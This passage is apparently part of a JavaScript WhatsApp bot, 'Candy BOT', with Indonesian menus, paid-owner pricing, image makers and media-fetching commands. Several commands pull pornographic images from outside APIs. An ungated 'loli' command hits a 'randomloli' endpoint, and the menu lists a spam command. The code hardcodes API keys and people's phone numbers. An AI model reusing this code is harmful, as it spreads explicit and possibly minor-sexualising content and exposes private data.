│❏ ${prefix}fdeface [ replyimg link|teks1|teks2 ]
│❏ ${prefix}listgrup
│❏ ${prefix}baileys [ reply message ]
│❏ ${prefix}getcaption [ reply message ]
│❏ ${prefix}pantun
│❏ ${prefix}tospam [ reply audio/sticker/image|jumlah ]
│❏ ${prefix}sharelock [ teks1|teks2 ]
│❏ ${prefix}dadu
│
└────────────────────⳹`
sendButImage(from, `${menu}`, `Candy BOT BY Nathan`, gambar, [
{
      buttonId: `${prefix}snk`,
      buttonText: {
        displayText: `SYARAT & KETENTUAN`,
      },
      type: 1,
    }, {
      buttonId: `${prefix}ping`,
      buttonText: {
        displayText: `SPEED`,
      },
      type: 1,
    }, {
      buttonId: `${prefix}owner`,
      buttonText: {
        displayText: `OWNER`,
      },
      type: 1,
    },
  ], {quoted: ftroli, thumbnail: fs.readFileSync(`./logoku.jpg`), contextInfo: { forwardingScore: 99999, isForwarded: true }});
break
case 'mode':
buttonss = [{buttonId: `public`, buttonText: {displayText: 'PUBLIC'}, type: 1},{buttonId: `self`, buttonText: {displayText: 'SELF'}, type: 1}]
const buMess = {
    contentText: "SELF/PUBLIC",
    footerText: 'Silahkan Pilih Salah Satu',
    buttons: buttonss,
    headerType: 1
}
await nathan.sendMessage(from, buMess, MessageType.buttonsMessage, {quoted: ftroli})
break
case 'tqto':
stod = `${sender.split('@')[0]}@s.whatsapp.net`
taggg =`
 ◪• RIFKI WANDI ⟨ @6285721599053 ⟩
 ◪• RIFKI BOTX ⟨ @6285846098802 ⟩
 ◪• TAUFIK GANZ ⟨ @6285642423940 ⟩
 ◪• BOT INDO ⟨ @628811929177 ⟩
 ◪• ARIFI RAZZAQ ⟨ @6281261324817 ⟩
 ◪• NATHAN ⟨ @6287834993722 ⟩
 ◪• CANDY BOT ⟨ @62878349937226 ⟩
 ◪• ZEEONE OFC ⟨ @62887435047326 ⟩
 ◪• ALDI FAUZI ⟨ @6285697725326 ⟩
 ◪• BANG ARYA ⟨ @62895340972894 ⟩
 ◪• HARDIANTO ⟨ @62895325697662 ⟩`
mentions(taggg, [`62895325697662@s.whatsapp.net`,`6285697725326@s.whatsapp.net`,`62887435047326@s.whatsapp.net`,`628811929177@s.whatsapp.net`,`6281261324817@s.whatsapp.net`,`6287834993722@s.whatsapp.net`,`62878349937226@s.whatsapp.net`, `6282193115723@s.whatsapp.net`,`6285721599053@s.whatsapp.net`,`6285642423940@s.whatsapp.net`,`6285721599053@s.whatsapp.net`,`6285846098802@s.whatsapp.net`,`62895340972894@s.whatsapp.net`], true)
break
case 'infobot':
timestampe = speed();
latensie = speed() - timestampe
runtime = process.uptime()
try {
    pic = await nathan.getProfilePicture(sender)
  } catch {
    pic = fs.readFileSync('./logoku.jpg')
  }
  gambar = await getBuffer(pic)
nani = `

「 INFO BOT 」

❏ Mode = ${publik ? 'Public' : 'Self'}

❏ Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}

❏ Runtime = ${waktu(runtime)}

❏ Nama Bot = ${NamaBot}

❏ Youtube = https://youtube.com/c/ZEROBOT7

❏ Creator Bot = Nathan`

sendButImage(from, nani, `Candy BOT`, gambar, [
{
      buttonId: `${prefix}owner`,
      buttonText: {
        displayText: `OWNER`,
      },
      type: 1,
    },
  ], {quoted: ftroli, thumbnail: fs.readFileSync(`./logoku.jpg`), contextInfo: { forwardingScore: 99999, isForwarded: true }});

break
case 'towner':
			const buttoonsss = [{buttonId: `${prefix}iyabang`, buttonText: {displayText: 'IYA KAK'}, type: 1},{buttonId: `${prefix}gaklah`, buttonText: {displayText: 'ENGGAK KAK'}, type: 1}]
			const buttonMessagee = {
			headerType: "IMAGE",
			contentText: "Apakah Anda Ingin Menjadi Owner Candy BOT? ",
			footerText: 'CANDY BOT BY NATHAN',
			buttons: buttoonsss,
			headerType: 1
			}
            nathan.sendMessage(from, buttonMessagee, MessageType.buttonsMessage, 
             {contextInfo:{"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `6287834993722@s.whatsapp.net`, 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": `CANDY BOT BY NATHAN`, 'jpegThumbnail': ofrply}}}})
break
            case 'gaklah':
            reply(`Yodah Gak Jadi:v`)
            break
                    case 'iyabang':
            listt = `*CANDY BOT*
            
1 Minggu : 5k
1 Bulan : 10k
2 Bulan : 20k
3 Bulan : 30k
Permanen : 70k (With Script) 

Minat Chat Owner`
let prep = await nathan.prepareMessage(from, ofrply, image)
let imgMsg = prep.message.imageMessage
res = await nathan.prepareMessageFromContent(from,{
"productMessage":{
"product":{
"productImage": imgMsg,
"productId": "5778732458865756",
"title": `Candy BOT`,
"description": `${listt}`,
"currencyCode": "IDR",
"priceAmount1000": "50000000",
"productImageCount": 1
},
"businessOwnerJid": "6287834993722@s.whatsapp.net",
}
}, {quoted: ftrol, mimetype: 'image/jpeg'})
nathan.relayWAMessage(res)
			const buttonsss = [{buttonId: `${prefix}owner`, buttonText: {displayText: 'OWNER'}, type: 1}]
			const buttonMessageee = {
			headerType: "IMAGE",
			contentText: "Silahkan Hubungi Owner",
			footerText: 'Candy BOT BY NATHAN',
			buttons: buttonsss,
			headerType: 1
			}
            nathan.sendMessage(from, buttonMessageee, MessageType.buttonsMessage, 
            {contextInfo:{"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `6287834993722@s.whatsapp.net`, 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": `CANDY BOT BY NATHAN`, 'jpegThumbnail': ofrply}}}})
break
//Nathan Jadibot
case 'jadibot':
        buttons = [{buttonId: `${prefix}jadibots`,buttonText:{displayText: `Numpang Jadi Bot`},type:1},{buttonId:`${prefix}listbot`,buttonText:{displayText:'List Bot Numpang'},type:1},{buttonId:`${prefix}stopjadibot`,buttonText:{displayText:'Stop Numpang Bot'},type:1}]
        buttonsMessage = {footerText: `Candy BOT BY Nathan`,
        contentText:`*Note* Ini Cuma Numpang, Jadi Bisa Dipilih Kak ${pushname}`,buttons,headerType:1}
        prep = await nathan.prepareMessageFromContent(from,{buttonsMessage},{ sendEphemeral: true, quoted: ftroli })
        nathan.relayWAMessage(prep)
        break;
    case 'jadibots':
        if(mek.key.fromMe) return reply('Tidak Bisa Jadibot Di Dalam Bot')
        jadibot(reply,nathan,from)
        break
    case 'listbot':
        let tekss = '「 *LIST JADIBOT* 」\n'
        for(let i of listjadibot) {
        tekss += `
*Nomor* : ${i.jid.split('@')[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
        }
        reply(tekss)
        break
    case 'stopjadibot':
        if(mek.key.fromMe)return reply('Tidak Dapat Stop Kecuali Owner')
        stopjadibot(reply)
        break
//Hardianto nsfw
case 'yuri':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
kon = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=yuri&apikey=hardianto`)
anu = await getBuffer(kon)
nathan.sendMessage(from, anu, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'anal':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
aku = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=anal&apikey=hardianto`)
kon = await getBuffer(aku)
nathan.sendMessage(from, kon, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'lesbian':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
kau = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=lesbian&apikey=hardianto`)
kon = await getBuffer(kau)
nathan.sendMessage(from, kon, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'eroneko':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroNeko&apikey=hardianto`)
kon = await getBuffer(hai)
nathan.sendMessage(from, kon, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'bj':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=bJ&apikey=hardianto`)
kon = await getBuffer(hai)
nathan.sendMessage(from, kon, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'kitsune':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=kitsune&apikey=hardianto`)
kon = await getBuffer(hai)
nathan.sendMessage(from, kon, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'pussy':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=pussy&apikey=hardianto`)
nathan.sendMessage(from, hai, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'wallpaper':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=wallpaper&apikey=hardianto`)
kon = await getBuffer(hai)
nathan.sendMessage(from, kon, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'randomwp':
get_result = await fetchJson(`https://h4ck3rs404-api.herokuapp.com/api/random/wallpaper?apikey=404Api`)
reply(mess.wait)
get_result = get_result.result.url
var ini_buffer = await getBuffer(get_result)
nathan.sendMessage(from, ini_buffer, image, {quoted: ftroli})
break
case 'neko2':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
kon = await getBuffer(hai)
nathan.sendMessage(from, kon, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'baka':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=baka&apikey=hardianto`)
kon = await getBuffer(hai)
nathan.sendMessage(from, kon, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'slap':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=slap&apikey=hardianto`)
kon = await getBuffer(hai)
nathan.sendMessage(from, kon, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'poke':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=poke&apikey=hardianto`)
kon = await getBuffer(hai)
nathan.sendMessage(from, kon, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'neko2':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
kon = await getBuffer(hai)
nathan.sendMessage(from, kon, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'keta':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=keta&apikey=hardianto`)
kon = await getBuffer(hai)
nathan.sendMessage(from, kon, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case  'awoo':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
buffer = await getBuffer(anu.url)
nathan.sendMessage(from, buffer, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case  'blowjob':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
buffer = await getBuffer(anu.url)
nathan.sendMessage(from, buffer, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case  'hentai': 
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
nathan.sendMessage(from, buffer, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case  'megumin':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
nathan.sendMessage(from, buffer, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case  'neko':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
nathan.sendMessage(from, buffer, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case  'trapnime':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
buffer = await getBuffer(anu.url)
nathan.sendMessage(from, buffer, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
//Done
case 'nuliskiri':
if (!c) return reply('Textnya Mana?')
reply(mess.wait)
kon = (`https://hardianto-chan.herokuapp.com/api/nuliskiri?text=${c}&apikey=hardianto`)
anu = await getBuffer(kon)
nathan.sendMessage(from, anu, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'nuliskanan':
if (!c) return reply('Textnya Mana?')
reply(mess.wait)
kon = (`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${c}&apikey=hardianto`)
anu = await getBuffer(kon)
nathan.sendMessage(from, anu, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'foliokanan':
if (!c) return reply('Textnya Mana?')
reply(mess.wait)
kon = (`https://hardianto-chan.herokuapp.com/api/foliokanan?text=${c}&apikey=hardianto`)
anu = await getBuffer(kon)
nathan.sendMessage(from, anu, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'foliokiri':
if (!c) return reply('Textnya Mana?')
reply(mess.wait)
kon = (`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${c}&apikey=hardianto`)
anu = await getBuffer(kon)
nathan.sendMessage(from, anu, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
//Hunte
case 'qrcode':
if (!c) return reply('Textnya Mana?')
reply(mess.wait)
anu = (`https://bx-hunter.herokuapp.com/api/qrcode?text=${c}&apikey=${HunterApi}`)
img = await getBuffer(anu)
nathan.sendMessage(from, img, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'waifu':
reply(mess.wait)
anu = (`https://bx-hunter.herokuapp.com/api/sfw/waifu?apikey=${HunterApi}`)
img = await getBuffer(anu)
nathan.sendMessage(from, img, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'loli':
reply(mess.wait)
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/randomloli?apikey=${HunterApi}`)
img = await getBuffer(anu.link)
nathan.sendMessage(from, img, image, { quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
break
case 'xsearch':
case 'xs':
if (!c) return reply('Cari Apa?')
pepex = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideosearch?query=${c}&apikey=${HunterApi}`)
reply(mess.wait)
pepex = pepex.result
ini_txt = ""
for (var x of pepex) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Info : ${x.info}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}───────────────\n\n┌ ◪ *DOWNLOAD*
└ ${prefix}xvideo [link xvid] = Video`
nathan.sendMessage(from, anu, text, {quoted: ftroli})
break
case 'xvideo':
case 'xv':
if (!c) return reply('Link Mana?')
x = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideodetail?url=${c}&apikey=${HunterApi}`)
reply(mess.wait)
vid = await getBuffer(x.result.files.low)
nathan.sendMessage(from, vid, video, {quoted: ftroli})
break
case 'notif':
									teks = `Notifikasi Dari @${sender.split("@")[0]}\n*Pesan : ${body.slice(7)}*`
									group = await nathan.groupMetadata(from);
									member = group['participants']
									jids = [];
									member.map(async adm => {
										jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
										})
										options = {
											text: teks,
											contextInfo: {
												mentionedJid: jids
												},
												quoted: ftroli
												}
												await nathan.sendMessage(from, options, text)
										break
//Xchillds
case 'maker2d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
		case 'maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
		case 'maker2d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'maker3d': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = body.slice(8)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'maker3d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'maker3d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'maker3d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'transformer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'googletxt':
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Raku Web|Nathan|ZEROBOT7`)
					makell = args.join(" ")
					l1 = makell.split("|")[0];
					l2 = makell.split("|")[1];
					l3 = makell.split("|")[0];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${l1}&text2=${l2}&text3=${l3}&theme=google-suggestion&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'battlefield': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} 4321|L y n x .`)
					makell = args.join(" ")
					l1 = makell.split("|")[0];
					l2 = makell.split("|")[1];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${l1}&text2=${l2}&theme=battlefield&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'coffeecup': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'coffeecup2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'neon': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
case 'glow': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=glow&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'summer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=summer&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'flower': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=flower&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'burn': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=text-burn&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'quote': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
case 'tahta': 
if (args.length < 1) return reply('*Teksnya Mana?*') 
harta = args.join(" ")
tahta = await getBuffer(`https://api.zeks.xyz/api/hartatahta?apikey=${ZeksApi}&text=${harta}`)
nathan.sendMessage(from,tahta,image,{quoted:ftroli}) 
break 
case 'goldbutton': 
  case 'gold': 
if (args.length < 1) return reply('*Teksnya Mana?*') 
gold = args.join(" ")
buffer = await getBuffer(`https://api.zeks.me/api/gbutton?apikey=${ZeksApi}&text=${gold}`)
nathan.sendMessage(from,buffer,image,{quoted:ftroli}) 
break 
case 'silver': 
  case 'silverbutton': 
if (args.length < 1) return reply('*Teksnya Mana?*') 
silver = args.join(" ")
buffer = await getBuffer(`https://api.zeks.me/api/sbutton?apikey=${ZeksApi}&text=${silver}`)
nathan.sendMessage(from,buffer,image,{quoted:ftroli}) 
break 
case 'nulis': 
if (args.length < 1) return reply('*Teksnya Mana?*') 
teks = args.join(" ")
nulis = await getBuffer(`https://api.zeks.me/api/nulis?apikey=${ZeksApi}&text=${teks}`)
nathan.sendMessage(from,nulis,image,{quoted:ftroli}) 
break 
			case 'wooden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
			case 'golden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Candy BOT`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					nathan.sendMessage(from, buffer1, image, {quoted: ftroli, thumbnail: fs.readFileSync('./logoku.jpg')})
					break
//Done
case 'ocr':
        if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const bent = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const media = await nathan.downloadAndSaveMediaMessage(bent)
            reply(mess.wait)
